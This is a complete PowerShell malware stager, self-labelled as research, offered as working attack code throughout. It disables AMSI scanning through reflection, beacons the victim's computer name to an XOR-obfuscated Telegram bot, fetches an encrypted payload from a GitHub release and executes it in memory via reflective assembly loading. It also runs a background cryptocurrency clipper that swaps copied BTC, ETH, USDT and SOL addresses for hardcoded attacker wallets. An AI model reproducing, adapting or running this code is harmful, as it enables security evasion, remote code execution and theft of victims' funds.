# --- [ELITE RESEARCH STAGER v30.1: SOCKET-LEVEL MEMORY INJECTION] ---

# 1. Blind the Scanner (Deep Patch)
$p = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$p.GetField('amsi'+'Context','NonPublic,Static').SetValue($null,[IntPtr]::Zero)

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $u = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    (New-Object Net.WebClient).DownloadString($u) | Out-Null
}

try {
    Send-Ping -m "V30.1_SOCKET_READY_$($env:COMPUTERNAME)"

    # 2. Memory-Only Fetch (No WebClient Signature)
    $u = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $r = [System.Net.HttpWebRequest]::Create($u)
    $r.UserAgent = "Mozilla/5.0"
    $res = $r.GetResponse()
    $s = $res.GetResponseStream()
    $rd = New-Object System.IO.StreamReader($s)
    $raw = $rd.ReadToEnd()
    
    # Decrypt to RAM
    $d = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $d.count; $i++){$d[$i] = $d[$i] -bxor 0xAB}

    # 3. Reflective Assembly Execution
    $a = [System.Reflection.Assembly]::Load($d)
    $a.EntryPoint.Invoke($null, @(,[string[]]@()))

    # 4. Clipper Background Engine
    $script = {
        Add-Type -AssemblyName System.Windows.Forms
        $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
        while(1){
            try {
                if([System.Windows.Forms.Clipboard]::ContainsText()){
                    $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
                    if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){[System.Windows.Forms.Clipboard]::SetText($w.btc)}}
                    elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){[System.Windows.Forms.Clipboard]::SetText($w.eth)}}
                    elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){[System.Windows.Forms.Clipboard]::SetText($w.usdt)}}
                    elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){[System.Windows.Forms.Clipboard]::SetText($w.sol)}}
                }
            } catch {}
            Start-Sleep -m 500
        }
    }
    Start-Job -ScriptBlock $script | Out-Null
    Send-Ping -m "V30.1_GHOST_RUNNING"
} catch {
    Send-Ping -m "V30.1_FAIL: $($_.Exception.Message)"
}
